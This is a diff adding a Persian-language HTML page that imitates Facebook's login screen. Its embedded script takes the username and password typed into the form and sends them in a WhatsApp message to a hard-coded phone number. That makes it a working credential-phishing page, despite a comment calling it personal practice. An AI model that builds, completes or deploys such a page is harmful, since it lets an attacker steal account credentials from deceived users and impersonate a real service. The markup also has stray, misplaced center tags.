@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> facebook log in </title>
+  <style>
+    /* ===== بدنه و فونت ===== */
+    body {
+        
+        <center>
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* ===== کانتینر اصلی ===== */
+    .container {
+      display: flex;
+      max-width: 900px;
+      width: 100%;
+      background: #fff;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+    }
+
+    /* ===== سمت چپ - متن ===== */
+    .left {
+      flex: 1;
+      padding: 60px 40px;
+      background: #1877f2;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .left h1 {
+      font-size: 64px;
+      margin: 0 0 20px 0;
+    }
+
+    .left p {
+      font-size: 20px;
+      line-height: 1.5;
+    }
+
+    /* ===== سمت راست - فرم ===== */
+    .right {
+      flex: 1;
+      padding: 60px 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 350px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border 0.3s;
+    }
+
+    .login-box input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 5px rgba(24,119,242,0.5);
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.1s;
+    }
+
+    .login-box button:hover {
+      background: #166fe5;
+      transform: translateY(-2px);
+    }
+
+    .login-box a {
+      display: block;
+      text-align: center;
+      margin: 12px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.3s;
+    }
+
+    .login-box a:hover {
+      color: #0f4bb5;
+    }
+
+    .login-box hr {
+      margin: 25px 0;
+      border: none;
+      border-top: 1px solid #ddd;
+    }
+
+    .create-account {
+      display: block;
+      text-align: center;
+      padding: 14px;
+      background: #42b72a;
+      color: white;
+      font-weight: bold;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 16px;
+      transition: background 0.3s, transform 0.1s;
+    }
+
+    .create-account:hover {
+      background: #36a420;
+      transform: translateY(-2px);
+    }
+
+    /* ===== ریسپانسیو ===== */
+    @media (max-width: 850px) {
+      .container {
+        flex-direction: column;
+        border-radius: 0;
+      }
+
+      .left, .right {
+        padding: 40px 20px;
+        text-align: center;
+      }
+
+      .left h1 {
+        font-size: 48px;
+      }
+
+      .left p {
+        font-size: 18px;
+      }
+    }
+  </style>
+  <script>
+    // تابع ارسال به واتساپ (برای تمرین شخصی)
+    function sendToWhatsApp(event) {
+      event.preventDefault();
+      const phone = "93764002319";
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const message = `یوزرنیم: ${username}%0Aپسورد: ${password}`;
+      const url = `https://wa.me/${phone}?text=${message}`;
+      window.open(url, "_blank");
+    }
+  </script>
+</head>
+</center>
+<body>
+  <div class="container">
+    <!-- سمت چپ -->
+    <div class="left">
+      <h1>facebook</h1>
+    </div>
+
+    <!-- سمت راست -->
+    <div class="right">
+      <div class="login-box">
+        <form onsubmit="sendToWhatsApp(event)">
+          <input type="text" id="username" placeholder="ایمیل یا شماره تلفن" required>
+          <input type="password" id="password" placeholder="گذرواژه" required>
+          <button type="submit">ورود</button>
+          <a href="#">گذرواژه خود را فراموش کرده‌اید؟</a>
+          <hr>
+          <a href="#" class="create-account">ایجاد حساب جدید</a>
+        </form>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
